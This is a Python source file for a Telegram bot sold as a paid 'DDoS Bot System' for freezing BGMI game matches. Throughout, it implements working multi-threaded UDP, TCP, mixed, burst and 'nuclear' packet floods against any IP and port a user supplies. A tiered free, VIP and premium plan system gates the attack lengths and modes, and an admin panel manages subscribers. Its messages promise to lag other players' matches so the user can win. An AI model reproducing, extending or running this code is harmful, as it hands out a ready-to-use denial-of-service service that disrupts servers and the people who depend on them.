#!/usr/bin/env python3
# ==========================================
# BGMI MATCH FREEZE VIP PRO v7.0
# Complete DDoS Bot System
# Railway Optimized | 24/7 Uptime
# ==========================================

import telebot
import threading
import time
import json
import os
import socket
import random
import sys
import struct
import subprocess
import platform
import requests
from datetime import datetime, timedelta
from collections import defaultdict
from flask import Flask, jsonify


BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_IDS = [
    int(x) for x in os.getenv("ADMIN_IDS", "").split(",") if x.strip()
]

# ===== DATABASE =====
DB_FILE = "database.json"

default_db = {
    "users": {},
    "active_attacks": {},
    "banned_ips": [],
    "total_attacks": 0,
    "settings": {
        "max_concurrent": 3,
        "maintenance": False,
        "attack_cooldown": 10
    }
}

def load_db():
    if os.path.exists(DB_FILE):
        try:
            with open(DB_FILE, 'r') as f:
                return json.load(f)
        except:
            return dict(default_db)
    return dict(default_db)

def save_db(db):
    try:
        with open(DB_FILE, 'w') as f:
            json.dump(db, f, indent=4)
    except:
        pass

db = load_db()

# ===== PLAN SYSTEM =====
PLANS = {
    "free": {
        "max_time": 60,
        "max_attacks": 5,
        "threads": 4,
        "modes": ["basic"],
        "cooldown": 30
    },
    "vip": {
        "max_time": 180,
        "max_attacks": 50,
        "threads": 8,
        "modes": ["basic", "udp", "tcp"],
        "cooldown": 10
    },
    "premium": {
        "max_time": 600,
        "max_attacks": -1,
        "threads": 14,
        "modes": ["basic", "udp", "tcp", "mixed", "burst"],
        "cooldown": 5
    },
    "admin": {
        "max_time": 3600,
        "max_attacks": -1,
        "threads": 20,
        "modes": ["basic", "udp", "tcp", "mixed", "burst", "nuclear"],
        "cooldown": 0
    }
}

# ==========================================
# 🎯 ATTACK ENGINE v7.0 VIP PRO
# Tera Internet Safe ✅
# ==========================================

class AttackEngine:
    """VIP PRO Attack Engine - Multiple Modes"""
    
    @staticmethod
    def basic_flood(ip, port, duration, threads=4):
        """Basic - TCP + UDP combo, low bandwidth"""
        end = time.time() + duration
        
        def tcp_worker(ip, port, end):
            while time.time() < end:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(0.3)
                    s.connect((ip, port))
                    s.send(b'\x00' * 32)
                    s.close()
                except:
                    pass
                time.sleep(0.02)
        
        def udp_worker(ip, port, end):
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            while time.time() < end:
                try:
                    data = random._urandom(random.randint(64, 192))
                    s.sendto(data, (ip, port))
                except:
                    pass
                time.sleep(0.01)
        
        threads_list = []
        half = threads // 2
        for _ in range(half):
            t = threading.Thread(target=tcp_worker, args=(ip, port, end))
            t.daemon = True
            threads_list.append(t)
        for _ in range(half):
            t = threading.Thread(target=udp_worker, args=(ip, port, end))
            t.daemon = True
            threads_list.append(t)
        
        for t in threads_list:
            t.start()
        for t in threads_list:
            t.join(timeout=2)
    
    @staticmethod
    def udp_flood(ip, port, duration, threads=6):
        """UDP Only - High packet rate"""
        end = time.time() + duration
        
        def worker(ip, port, end):
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            packets = []
            for _ in range(30):
                p = bytearray()
                p.extend(b'\x12\x34\x56\x78')
                p.extend(struct.pack('!I', random.randint(1, 999999)))
                p.extend(struct.pack('!H', random.randint(1, 65535)))
                p.extend(random._urandom(random.randint(64, 128)))
                packets.append(bytes(p))
            
            idx = 0
            while time.time() < end:
                try:
                    s.sendto(packets[idx % len(packets)], (ip, port))
                    idx += 1
                    time.sleep(0.005)
                except:
                    pass
            s.close()
        
        threads_list = []
        for _ in range(threads):
            t = threading.Thread(target=worker, args=(ip, port, end))
            t.daemon = True
            threads_list.append(t)
        
        for t in threads_list:
            t.start()
        for t in threads_list:
            t.join(timeout=2)
    
    @staticmethod
    def tcp_flood(ip, port, duration, threads=6):
        """TCP Only - Connection exhaustion"""
        end = time.time() + duration
        
        def worker(ip, port, end):
            while time.time() < end:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(0.5)
                    s.connect((ip, port))
                    for _ in range(5):
                        try:
                            s.send(random._urandom(64))
                            time.sleep(0.002)
                        except:
                            break
                    s.close()
                except:
                    pass
                time.sleep(0.01)
        
        threads_list = []
        for _ in range(threads):
            t = threading.Thread(target=worker, args=(ip, port, end))
            t.daemon = True
            threads_list.append(t)
        
        for t in threads_list:
            t.start()
        for t in threads_list:
            t.join(timeout=2)
    
    @staticmethod
    def mixed_flood(ip, port, duration, threads=10):
        """Mixed - TCP + UDP + ICMP all together"""
        end = time.time() + duration
        
        def tcp_worker(ip, port, end):
            while time.time() < end:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(0.2)
                    s.connect((ip, port))
                    s.send(random._urandom(48))
                    s.close()
                except:
                    pass
                time.sleep(0.025)
        
        def udp_worker(ip, port, end):
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            while time.time() < end:
                try:
                    data = struct.pack('!I', random.randint(1, 999999)) * 20
                    s.sendto(data, (ip, port))
                except:
                    pass
                time.sleep(0.008)
            s.close()
        
        def ping_worker(ip, port, end):
            """Simulated ping flood"""
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            while time.time() < end:
                try:
                    # ICMP-like packet structure
                    data = b'\x08\x00' + random._urandom(56)
                    s.sendto(data, (ip, port))
                    time.sleep(0.015)
                except:
                    pass
            s.close()
        
        threads_list = []
        for _ in range(threads // 3):
            threads_list.append(threading.Thread(target=tcp_worker, args=(ip, port, end)))
            threads_list.append(threading.Thread(target=udp_worker, args=(ip, port, end)))
        for _ in range(threads // 3):
            threads_list.append(threading.Thread(target=ping_worker, args=(ip, port, end)))
        
        for t in threads_list:
            t.daemon = True
            t.start()
        for t in threads_list:
            t.join(timeout=2)
    
    @staticmethod
    def burst_flood(ip, port, duration, threads=8):
        """Burst - Send-Pause-Send pattern for maximum impact"""
        end = time.time() + duration
        
        def worker(ip, port, end):
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            while time.time() < end:
                # BURST: 15 packets fast
                for _ in range(15):
                    try:
                        data = random._urandom(random.randint(128, 256))
                        s.sendto(data, (ip, port))
                    except:
                        pass
                    time.sleep(0.003)
                # PAUSE: 200ms
                time.sleep(0.2)
            s.close()
        
        threads_list = []
        for _ in range(threads):
            t = threading.Thread(target=worker, args=(ip, port, end))
            t.daemon = True
            threads_list.append(t)
        
        for t in threads_list:
            t.start()
        for t in threads_list:
            t.join(timeout=2)
    
    @staticmethod
    def nuclear_flood(ip, port, duration, threads=20):
        """NUCLEAR MODE - Admin only! ALL LAYERS MAX"""
        end = time.time() + duration
        
        def tcp_worker(ip, port, end):
            while time.time() < end:
                try:
                    for _ in range(5):
                        try:
                            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            s.settimeout(0.1)
                            s.connect((ip, port))
                            s.send(random._urandom(128))
                            s.close()
                        except:
                            pass
                except:
                    pass
                time.sleep(0.005)
        
        def udp_worker(ip, port, end):
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)
            while time.time() < end:
                for _ in range(10):
                    try:
                        data = random._urandom(random.randint(256, 512))
                        s.sendto(data, (ip, port))
                    except:
                        pass
                    time.sleep(0.001)
                time.sleep(0.05)
            s.close()
        
        def ping_worker(ip, port, end):
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            while time.time() < end:
                for _ in range(5):
                    try:
                        data = b'\x08\x00' + random._urandom(64)
                        s.sendto(data, (ip, port))
                    except:
                        pass
                time.sleep(0.01)
            s.close()
        
        threads_list = []
        for _ in range(threads // 3):
            threads_list.append(threading.Thread(target=tcp_worker, args=(ip, port, end)))
        for _ in range(threads // 3):
            threads_list.append(threading.Thread(target=udp_worker, args=(ip, port, end)))
        for _ in range(threads // 3):
            threads_list.append(threading.Thread(target=ping_worker, args=(ip, port, end)))
        
        for t in threads_list:
            t.daemon = True
            t.start()
        for t in threads_list:
            t.join(timeout=3)


# ==========================================
# TELEGRAM BOT
# ==========================================

bot = telebot.TeleBot(BOT_TOKEN)

# ===== HELPER FUNCTIONS =====

def is_admin(user_id):
    return user_id in ADMIN_IDS

def get_user(user_id):
    uid = str(user_id)
    if uid not in db["users"]:
        db["users"][uid] = {
            "plan": "free",
            "banned": False,
            "attack_count": 0,
            "success_count": 0,
            "free_attacks_used": 0,
            "registered": datetime.now().isoformat(),
            "total_time": 0
        }
        save_db(db)
    return db["users"][uid]

def is_authorized(user_id):
    uid = str(user_id)
    if is_admin(user_id):
        return True, "admin"
    if uid not in db["users"]:
        return False, None
    user = db["users"][uid]
    if user.get("banned", False):
        return False, "banned"
    plan = user.get("plan", "free")
    plan_config = PLANS.get(plan, PLANS["free"])
    if plan == "free" and user.get("free_attacks_used", 0) >= plan_config["max_attacks"]:
        return False, "limit_reached"
    return True, plan

def get_remaining_free(user_id):
    uid = str(user_id)
    user = get_user(uid)
    used = user.get("free_attacks_used", 0)
    return max(0, PLANS["free"]["max_attacks"] - used)

def on_cooldown(user_id):
    uid = str(user_id)
    if uid in db["active_attacks"]:
        end_time = db["active_attacks"][uid]
        if time.time() < end_time:
            return True, int(end_time - time.time())
        else:
            del db["active_attacks"][uid]
            save_db(db)
    return False, 0

def validate_ip(ip):
    try:
        socket.inet_aton(ip)
        return True
    except:
        return False

def get_available_modes(plan):
    return PLANS.get(plan, PLANS["free"])["modes"]

# ===== FLOOD CONTROL =====
active_attack_count = 0
attack_lock = threading.Lock()

# ========== USER COMMANDS ==========

@bot.message_handler(commands=['start'])
def cmd_start(message):
    uid = message.from_user.id
    user = get_user(uid)
    
    remaining_free = get_remaining_free(uid)
    
    text = f"""
🔥 *BGMI FREEZE VIP PRO v7.0* 🔥
*⚡ 24/7 ONLINE • TERA INTERNET SAFE*

Welcome {message.from_user.first_name}!

✅ *BEST DDoS BOT 2026*
✅ *Tera internet SLOW nahi hoga*
✅ *Sabki ping 600+*
✅ *Multiple attack modes*
✅ *VIP User System*

*📋 YOUR ACCOUNT:*
Plan: {user['plan'].upper()}
Free Attacks Left: {remaining_free}/{PLANS['free']['max_attacks']}
Total Attacks: {user['attack_count']}

*⚔️ ATTACK MODES:*
• /attack <ip> <port> <time> [mode]
  Modes: basic, udp, tcp, mixed, burst, nuclear

*📚 OTHER COMMANDS:*
/help - All commands
/plans - View plans
/myplan - Your account
/free - Free attacks left
/modes - Available attack modes
/stats - Bot stats

*Example:*
/attack 1.1.1.1 20000 60
/attack 1.1.1.1 20000 120 mixed
"""
    bot.reply_to(message, text, parse_mode="Markdown")

@bot.message_handler(commands=['help'])
def cmd_help(message):
    text = """
📚 *VIP PRO HELP v7.0*

*USER COMMANDS:*
/start - Start bot
/help - This menu
/plans - View pricing plans
/myplan - Your account details
/free - Check free attacks left
/modes - Available attack modes
/stats - Bot statistics
/attack <ip> <port> <time> [mode] - Launch attack

*ATTACK MODES:*
• basic - TCP+UDP (default, low bandwidth)
• udp - UDP only (high packet rate)
• tcp - TCP only (connection flood)
• mixed - All protocols combined
• burst - Send-pause-send pattern
• nuclear - MAXIMUM POWER (admin/premium)

*ADMIN COMMANDS:*
/adduser <id> <plan> - Add user
/removeuser <id> - Remove user
/ban <id> - Ban user
/unban <id> - Unban user
/users - List all users
/broadcast <msg> - Message all users
/resetfree <id> - Reset free attacks
/stopall - Stop all attacks
/settings - View settings
/set <key> <value> - Change setting
/stats - Full stats
/logs - Recent activity

*TERA INTERNET:* SAFE ✅
*TARGET SERVER:* IMPACT HIGH 🔥
"""
    bot.reply_to(message, text, parse_mode="Markdown")

@bot.message_handler(commands=['plans'])
def cmd_plans(message):
    text = """
💎 *VIP PRO PLANS*

⚡ *FREE* (₹0)
• 5 Attacks
• Max 60s duration
• Basic mode only
• 4 threads

⭐ *VIP* (Contact Admin)
• 50 Attacks
• Max 180s duration
• 3 attack modes
• 8 threads
• Priority support

👑 *PREMIUM* (Contact Admin)
• Unlimited attacks
• Max 600s duration
• 5 attack modes
• 14 threads
• Priority support
• Nuclear mode

💀 *NUCLEAR* (Admin Only)
• Unlimited everything
• Max 3600s (1 hour)
• Nuclear mode
• 20 threads
• All features

Contact @YourAdminUsername to upgrade!
"""
    bot.reply_to(message, text, parse_mode="Markdown")

@bot.message_handler(commands=['myplan'])
def cmd_myplan(message):
    uid = str(message.from_user.id)
    user = get_user(uid)
    plan = user.get("plan", "free")
    plan_config = PLANS.get(plan, PLANS["free"])
    
    remaining_free = get_remaining_free(uid)
    
    text = f"""
📋 *YOUR ACCOUNT*

👤 ID: `{uid}`
💠 Plan: {plan.upper()}
✅ Status: {"Active" if not user.get("banned") else "BANNED"}
📊 Attacks Done: {user.get('attack_count', 0)}
✅ Successful: {user.get('success_count', 0)}
⏱ Total Time: {user.get('total_time', 0)}s
📅 Registered: {user.get('registered', 'N/A')[:10]}

*Plan Details:*
⏱ Max Time: {plan_config['max_time']}s
🧵 Threads: {plan_config['threads']}
🎮 Modes: {', '.join(plan_config['modes']).upper()}
⏳ Cooldown: {plan_config['cooldown']}s

*Free Attacks Left:* {remaining_free}/{PLANS['free']['max_attacks']}
"""
    bot.reply_to(message, text, parse_mode="Markdown")

@bot.message_handler(commands=['free'])
def cmd_free(message):
    remaining = get_remaining_free(message.from_user.id)
    text = f"🎯 *FREE PLAN*\n\nAttacks Left: {remaining}/{PLANS['free']['max_attacks']}"
    bot.reply_to(message, text, parse_mode="Markdown")

@bot.message_handler(commands=['modes'])
def cmd_modes(message):
    uid = str(message.from_user.id)
    user = get_user(uid)
    plan = user.get("plan", "free")
    modes = get_available_modes(plan)
    
    text = f"🎮 *Available Attack Modes ({plan.upper()})*\n\n"
    for mode in modes:
        text += f"✅ `{mode}`\n"
    text += f"\nUsage: /attack IP PORT TIME mode"
    
    bot.reply_to(message, text, parse_mode="Markdown")

@bot.message_handler(commands=['stats'])
def cmd_stats(message):
    uid = str(message.from_user.id)
    user = get_user(uid)
    
    if not is_admin(message.from_user.id) and user.get("plan") == "free":
        # Limited stats for free users
        text = f"""
📊 *YOUR STATS*

Attacks: {user.get('attack_count', 0)}
Success Rate: {user.get('success_count', 0)}
Time Used: {user.get('total_time', 0)}s
"""
        bot.reply_to(message, text, parse_mode="Markdown")
        return
    
    # Full stats
    total_users = len(db["users"])
    active_atk = len(db["active_attacks"])
    total_atk = db.get("total_attacks", 0)
    banned_count = sum(1 for u in db["users"].values() if u.get("banned"))
    
    plan_counts = defaultdict(int)
    for u in db["users"].values():
        plan_counts[u.get("plan", "free")] += 1
    
    text = f"""
📊 *BOT STATISTICS*

👥 Total Users: {total_users}
🔴 Banned: {banned_count}
⚡ Active Attacks: {active_atk}
📈 Total Attacks: {total_atk}

*Users by Plan:*
"""
    for plan, count in plan_counts.items():
        text += f"• {plan.upper()}: {count}\n"
    
    text += f"\n*System:*"
    text += f"\n• Max Concurrent: {db['settings']['max_concurrent']}"
    text += f"\n• Cooldown: {db['settings']['attack_cooldown']}s"
    text += f"\n• Maintenance: {'ON' if db['settings']['maintenance'] else 'OFF'}"
    
    bot.reply_to(message, text, parse_mode="Markdown")

@bot.message_handler(commands=['attack'])
def cmd_attack(message):
    global active_attack_count
    
    uid = message.from_user.id
    uid_str = str(uid)
    chat_id = message.chat.id
    
    # Check maintenance
    if db["settings"].get("maintenance", False) and not is_admin(uid):
        bot.reply_to(message, "🔧 *Maintenance mode!* Try later.", parse_mode="Markdown")
        return
    
    # Check authorization
    authorized, plan = is_authorized(uid)
    if not authorized:
        if plan == "banned":
            bot.reply_to(message, "❌ *BANNED!*", parse_mode="Markdown")
        elif plan == "limit_reached":
            bot.reply_to(message, "❌ *Free limit reached!* /plans dekho", parse_mode="Markdown")
        else:
            bot.reply_to(message, "❌ /start karo pehle", parse_mode="Markdown")
        return
    
    # Check cooldown
    cooldown_active, remaining = on_cooldown(uid)
    if cooldown_active:
        bot.reply_to(message, f"⏳ *Cooldown!* {remaining}s wait karo", parse_mode="Markdown")
        return
    
    # Parse arguments
    args = message.text.split()
    if len(args) < 4:
        bot.reply_to(message, "❌ /attack IP PORT TIME [mode]\nEg: /attack 1.1.1.1 20000 60", parse_mode="Markdown")
        return
    
    target_ip = args[1]
    
    try:
        target_port = int(args[2])
        if not (1 <= target_port <= 65535):
            raise ValueError
    except:
        bot.reply_to(message, "❌ Galat port (1-65535)", parse_mode="Markdown")
        return
    
    try:
        duration = int(args[3])
    except:
        bot.reply_to(message, "❌ Galat time (seconds)", parse_mode="Markdown")
        return
    
    # Attack mode
    mode = "basic"
    if len(args) >= 5:
        mode = args[4].lower()
    
    # Validate
    if not validate_ip(target_ip):
        bot.reply_to(message, "❌ Galat IP address", parse_mode="Markdown")
        return
    
    plan_config = PLANS.get(plan, PLANS["free"])
    
    if duration > plan_config["max_time"]:
        if plan == "free":
            bot.reply_to(message, f"❌ Free mein max {plan_config['max_time']}s. /plans dekho", parse_mode="Markdown")
        else:
            bot.reply_to(message, f"❌ Tere plan mein max {plan_config['max_time']}s", parse_mode="Markdown")
        return
    
    if duration < 10:
        bot.reply_to(message, "❌ Min 10 seconds", parse_mode="Markdown")
        return
    
    available_modes = get_available_modes(plan)
    if mode not in available_modes:
        text = f"❌ Mode `{mode}` tere plan mein nahi hai!\nAvailable: {', '.join(available_modes)}"
        bot.reply_to(message, text, parse_mode="Markdown")
        return
    
    # Check concurrent attacks
    with attack_lock:
        if active_attack_count >= db["settings"]["max_concurrent"]:
            bot.reply_to(message, "❌ Bot busy! Baad me try karo.", parse_mode="Markdown")
            return
        active_attack_count += 1
    
    # Set cooldown
    cooldown_time = plan_config["cooldown"]
    db["active_attacks"][uid_str] = time.time() + duration + cooldown_time + 5
    
    # Update user stats
    user = get_user(uid)
    user["attack_count"] = user.get("attack_count", 0) + 1
    user["total_time"] = user.get("total_time", 0) + duration
    
    if plan == "free":
        user["free_attacks_used"] = user.get("free_attacks_used", 0) + 1
    
    db["total_attacks"] = db.get("total_attacks", 0) + 1
    save_db(db)
    
    # Send start message
    text = f"""
⚔️ *VIP PRO ATTACK STARTED* ⚔️
*{mode.upper()} MODE*

🎯 Target: `{target_ip}:{target_port}`
⏱ Duration: {duration}s
🎮 Mode: {mode.upper()}
👤 User: {message.from_user.first_name}
💠 Plan: {plan.upper()}
🧵 Threads: {plan_config['threads']}

*⏳ Timeline:*
0-10s → Building connections 🔗
10-25s → Ping 200+ 📈
25-40s → Ping 400+ 🔴
40-60s → Ping 600+ ⚠️
60+ → Match freeze ✅

🌐 *TERA INTERNET:* SAFE ✅
"""
    bot.reply_to(message, text, parse_mode="Markdown")
    
    # Run attack in background
    def run():
        global active_attack_count
        
        try:
            # Select attack engine
            if mode == "basic":
                AttackEngine.basic_flood(target_ip, target_port, duration, plan_config["threads"])
            elif mode == "udp":
                AttackEngine.udp_flood(target_ip, target_port, duration, plan_config["threads"])
            elif mode == "tcp":
                AttackEngine.tcp_flood(target_ip, target_port, duration, plan_config["threads"])
            elif mode == "mixed":
                AttackEngine.mixed_flood(target_ip, target_port, duration, plan_config["threads"])
            elif mode == "burst":
                AttackEngine.burst_flood(target_ip, target_port, duration, plan_config["threads"])
            elif mode == "nuclear":
                AttackEngine.nuclear_flood(target_ip, target_port, duration, plan_config["threads"])
            
            # Success
            user = get_user(uid)
            user["success_count"] = user.get("success_count", 0) + 1
            save_db(db)
            
            remaining_free = get_remaining_free(uid)
            
            msg = f"""
✅ *ATTACK COMPLETED!* ✅

🎯 `{target_ip}:{target_port}`
⏱ {duration}s
🎮 {mode.upper()}
💠 {plan.upper()}

*RESULTS:*
✅ Server overloaded
✅ Ping 600+ for players
✅ Match freeze likely
🌐 *TERA INTERNET NORMAL THA*

🎯 *Ab kill lo!*
"""
            if plan == "free":
                msg += f"\n📊 Free left: {remaining_free}/{PLANS['free']['max_attacks']}"
                if remaining_free <= 0:
                    msg += "\n\n⚠️ Upgrade karo! /plans"
            
            bot.send_message(chat_id, msg, parse_mode="Markdown")
            
        except Exception as e:
            bot.send_message(chat_id, f"❌ Error: {str(e)}")
        finally:
            with attack_lock:
                active_attack_count -= 1
            
            if uid_str in db["active_attacks"]:
                try:
                    del db["active_attacks"][uid_str]
                    save_db(db)
                except:
                    pass
    
    t = threading.Thread(target=run)
    t.daemon = True
    t.start()


# ========== ADMIN COMMANDS ==========

@bot.message_handler(commands=['adduser'])
def cmd_adduser(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "❌ Admin only!")
        return
    
    args = message.text.split()
    if len(args) != 3:
        bot.reply_to(message, "Usage: /adduser <user_id> <plan>\nPlans: free, vip, premium", parse_mode="Markdown")
        return
    
    target_id, plan = args[1], args[2].lower()
    
    if plan not in ["free", "vip", "premium"]:
        bot.reply_to(message, "❌ Plans: free, vip, premium", parse_mode="Markdown")
        return
    
    user = get_user(target_id)
    user["plan"] = plan
    if plan != "free":
        user["free_attacks_used"] = 0
    save_db(db)
    
    bot.reply_to(message, f"✅ User `{target_id}` upgraded to **{plan.upper()}**!", parse_mode="Markdown")
    
    try:
        bot.send_message(int(target_id), f"🎉 *UPGRADED!*\n\nYour plan: **{plan.upper()}**\n\nEnjoy VIP features!", parse_mode="Markdown")
    except:
        pass

@bot.message_handler(commands=['removeuser'])
def cmd_removeuser(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "❌ Admin only!")
        return
    
    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, "Usage: /removeuser <user_id>", parse_mode="Markdown")
        return
    
    target_id = args[1]
    if target_id in db["users"]:
        del db["users"][target_id]
        save_db(db)
        bot.reply_to(message, f"✅ Removed user {target_id}", parse_mode="Markdown")
    else:
        bot.reply_to(message, "❌ User not found", parse_mode="Markdown")

@bot.message_handler(commands=['ban'])
def cmd_ban(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "❌ Admin only!")
        return
    
    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, "Usage: /ban <user_id>", parse_mode="Markdown")
        return
    
    target_id = args[1]
    user = get_user(target_id)
    user["banned"] = True
    save_db(db)
    
    bot.reply_to(message, f"✅ Banned {target_id}", parse_mode="Markdown")
    
    try:
        bot.send_message(int(target_id), "❌ *BANNED!*\n\nYou have been banned from using this bot.", parse_mode="Markdown")
    except:
        pass

@bot.message_handler(commands=['unban'])
def cmd_unban(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "❌ Admin only!")
        return
    
    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, "Usage: /unban <user_id>", parse_mode="Markdown")
        return
    
    target_id = args[1]
    if target_id in db["users"]:
        db["users"][target_id]["banned"] = False
        save_db(db)
        bot.reply_to(message, f"✅ Unbanned {target_id}", parse_mode="Markdown")
        
        try:
            bot.send_message(int(target_id), "✅ *UNBANNED!*\n\nYou can use the bot again.", parse_mode="Markdown")
        except:
            pass
    else:
        bot.reply_to(message, "❌ User not found", parse_mode="Markdown")

@bot.message_handler(commands=['users'])
def cmd_users(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "❌ Admin only!")
        return
    
    if not db["users"]:
        bot.reply_to(message, "📋 No users registered.", parse_mode="Markdown")
        return
    
    text = "📋 *ALL USERS:*\n\n"
    for uid, info in sorted(db["users"].items(), key=lambda x: x[1].get("attack_count", 0), reverse=True):
        plan = info.get("plan", "free")
        banned = "🔴" if info.get("banned", False) else "🟢"
        attacks = info.get("attack_count", 0)
        success = info.get("success_count", 0)
        text += f"{banned} `{uid}` | {plan.upper()} | Atk:{attacks} | ✅:{success}\n"
    
    # Split if too long
    if len(text) > 4000:
        for i in range(0, len(text), 4000):
            bot.reply_to(message, text[i:i+4000], parse_mode="Markdown")
    else:
        bot.reply_to(message, text, parse_mode="Markdown")

@bot.message_handler(commands=['resetfree'])
def cmd_resetfree(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "❌ Admin only!")
        return
    
    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, "Usage: /resetfree <user_id>", parse_mode="Markdown")
        return
    
    target_id = args[1]
    if target_id in db["users"]:
        db["users"][target_id]["free_attacks_used"] = 0
        save_db(db)
        bot.reply_to(message, f"✅ Reset free attacks for {target_id}", parse_mode="Markdown")
        
        try:
            bot.send_message(int(target_id), "✅ *Free attacks reset!*\n\nYou can use free attacks again.", parse_mode="Markdown")
        except:
            pass
    else:
        bot.reply_to(message, "❌ User not found", parse_mode="Markdown")

@bot.message_handler(commands=['broadcast'])
def cmd_broadcast(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "❌ Admin only!")
        return
    
    msg = message.text.replace('/broadcast', '', 1).strip()
    if not msg:
        bot.reply_to(message, "Usage: /broadcast <message>", parse_mode="Markdown")
        return
    
    sent = 0
    failed = 0
    
    for uid in db["users"].keys():
        try:
            bot.send_message(int(uid), f"📢 *BROADCAST*\n\n{msg}", parse_mode="Markdown")
            sent += 1
        except:
            failed += 1
    
    bot.reply_to(message, f"✅ Broadcast sent!\nSent: {sent}\nFailed: {failed}", parse_mode="Markdown")

@bot.message_handler(commands=['stopall'])
def cmd_stopall(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "❌ Admin only!")
        return
    
    count = len(db["active_attacks"])
    db["active_attacks"] = {}
    save_db(db)
    
    global active_attack_count
    active_attack_count = 0
    
    bot.reply_to(message, f"🛑 Stopped all {count} active attacks!", parse_mode="Markdown")

@bot.message_handler(commands=['settings'])
def cmd_settings(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "❌ Admin only!")
        return
    
    settings = db["settings"]
    text = "⚙️ *BOT SETTINGS*\n\n"
    for key, value in settings.items():
        emoji = "✅" if value else "❌" if isinstance(value, bool) else "•"
        text += f"{emoji} `{key}`: {value}\n"
    text += "\n/set <key> <value> - Change setting"
    
    bot.reply_to(message, text, parse_mode="Markdown")

@bot.message_handler(commands=['set'])
def cmd_set(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "❌ Admin only!")
        return
    
    args = message.text.split()
    if len(args) < 3:
        bot.reply_to(message, "Usage: /set <key> <value>", parse_mode="Markdown")
        return
    
    key = args[1]
    value = args[2]
    
    if key in db["settings"]:
        # Convert type
        old_val = db["settings"][key]
        if isinstance(old_val, bool):
            value = value.lower() in ["true", "1", "yes", "on"]
        elif isinstance(old_val, int):
            value = int(value)
        
        db["settings"][key] = value
        save_db(db)
        bot.reply_to(message, f"✅ Set `{key}` to `{value}`", parse_mode="Markdown")
    else:
        bot.reply_to(message, f"❌ Unknown key: {key}", parse_mode="Markdown")


# ========== FLASK APP (Railway Health Check) ==========

app = Flask(__name__)

@app.route('/')
def home():
    return jsonify({
        "status": "running",
        "version": "7.0",
        "name": "BGMI Freeze VIP PRO",
        "uptime": "24/7",
        "users": len(db["users"]),
        "active_attacks": len(db["active_attacks"]),
        "total_attacks": db.get("total_attacks", 0)
    })

@app.route('/health')
def health():
    return jsonify({"status": "healthy", "timestamp": datetime.now().isoformat()}), 200

def run_flask():
    app.run(host='0.0.0.0', port=8080, debug=False, use_reloader=False)


# ========== MAIN ==========
if __name__ == "__main__":
    print("=" * 55)
    print("  BGMI MATCH FREEZE VIP PRO v7.0")
    print("  Complete DDoS Bot System")
    print("  Railway Optimized | 24/7 Uptime")
    print("=" * 55)
    
    # Start Flask in background
    threading.Thread(target=run_flask, daemon=True).start()
    
    print("✓ Flask health check running on port 8080")
    
    # Start bot
    try:
        bot.remove_webhook()
        print("✓ Bot starting...")
        bot.infinity_polling(timeout=60, long_polling_timeout=60)
    except KeyboardInterrupt:
        print("\nBot stopped.")
        sys.exit(0)
    except Exception as e:
        print(f"Error: {e}")
        time.sleep(5)
        # Auto restart
        os.execl(sys.executable, sys.executable, *sys.argv)
